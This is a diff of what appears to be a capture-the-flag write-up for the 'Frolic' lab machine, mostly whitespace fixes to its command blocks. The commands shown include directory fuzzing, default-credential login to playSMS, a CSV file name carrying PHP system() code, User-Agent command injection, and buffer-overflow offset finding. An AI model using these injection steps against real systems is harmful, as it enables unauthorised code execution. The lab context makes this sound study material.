@@ -86,8 +86,7 @@ curl -s -X GET http://frolic.htb:1880/ui -I
 I perform a directory enumeration with `wfuzz` on the first port, but I don't have the necessary permissions to access the resources, I suspect I must be logged in. If I search for the default login directory of the **Nginx** web server, I find that it is **“/admin”**, I access and try some **[SQLi](https://portswigger.net/web-security/sql-injection){:target="_blank"}** but they do not work and also I run the risk of being banned.
 
 ```bash
-wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://frolic.htb:1880/F
-UZZ
+wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://frolic.htb:1880/FUZZ
 # settings ?
 ```
 
@@ -255,15 +254,15 @@ If I enumerate again subdirectories with `wfuzz`, but now in the path **"/dev"**
 
 ```bash
 wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://frolic.htb:9999/dev/FUZZ
-#       test, backup
+# test, backup
 
-#       http://10.10.10.111:9999/dev/test
+# http://10.10.10.111:9999/dev/test
 
 file test
 cat test
 
 # http://10.10.10.111:9999/dev/backup/    :)
-#    /playsms
+# /playsms
 # http://frolic.htb:9999/playsms
 # Redirect --> http://frolic:9999/playsms/index.php?app=main&inc=core_auth&route=login
 ```
@@ -283,8 +282,8 @@ After logging in with default or typical passwords, I log in with the one I foun
 ```bash
 # http://frolic:9999/playsms/index.php?app=main&inc=core_auth&route=login
 # google.es --> playsms default credentials
-#    admin:admin               :(
-#    guest:guest               :)
+# admin:admin               :(
+# guest:guest               :)
 
 searchsploit playsms
 searchsploit playsms | grep -v -i 'metasploit'
@@ -303,7 +302,7 @@ I try with the first exploit in the list, with `searchsploit` I get information 
 ```bash
 searchsploit -x 42003.txt
 nvim example.csv
-#        upload          :(
+# upload          :(
 
 touch "<?php system('uname -a'); dia();?>.csv"
 ```
@@ -323,9 +322,9 @@ searchsploit -x 42044
 burpsuite &>/dev/null & disown
 
 nvim backdoor.csv
-#         upload          :)
-#         http://10.10.10.111:9999/playsms/index.php?app=main&inc=feature_phonebook&route=import&op=list
-#         Upload: backdoor.csv
+# upload          :)
+# http://10.10.10.111:9999/playsms/index.php?app=main&inc=feature_phonebook&route=import&op=list
+# Upload: backdoor.csv
 
 # Burp: User-Agent: id                Intercept OFF         :(
 ```
@@ -575,7 +574,7 @@ gdb ./rop
   /> pattern offset AAHA
   /> pattern offset 0x41484141
   /> pattern offset $eip
-# --> 62
+# --> 61
   /> r $(python2 -c 'print "A"*61 + "B"*4')
 # :( ??
 ```
